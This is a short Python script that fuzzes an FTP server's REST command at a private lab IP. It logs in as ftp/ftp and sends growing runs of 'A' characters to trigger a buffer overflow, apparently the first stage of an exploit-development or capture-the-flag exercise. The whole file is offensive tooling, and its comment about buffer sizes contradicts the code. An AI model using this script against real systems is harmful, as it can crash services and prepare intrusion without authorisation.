#!/usr/bin/python
import socket

# Create an array of buffers, from 20 to 2000, with increments of 20.
buffer=["A"]
counter=20
while len(buffer) <= 30:
        buffer.append("A"*counter)
        counter=counter+100

# Define the FTP commands to be fuzzed
commands=["REST"]

# Run the fuzzing loop
for command in commands:
        for string in buffer:
                print "Fuzzing" + command + " with length:" +str(len(string))
                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                connect=s.connect(('10.10.10.227',21)) # Target IP address
                s.recv(1024)
                s.send('USER ftp\r\n') # login user
                s.recv(1024)
                s.send('PASS ftp\r\n') # login password
                s.recv(1024)
                s.send(command + ' ' + string + '\r\n') # buffer
                s.recv(1024)
                s.send('QUIT\r\n')
                s.close()  
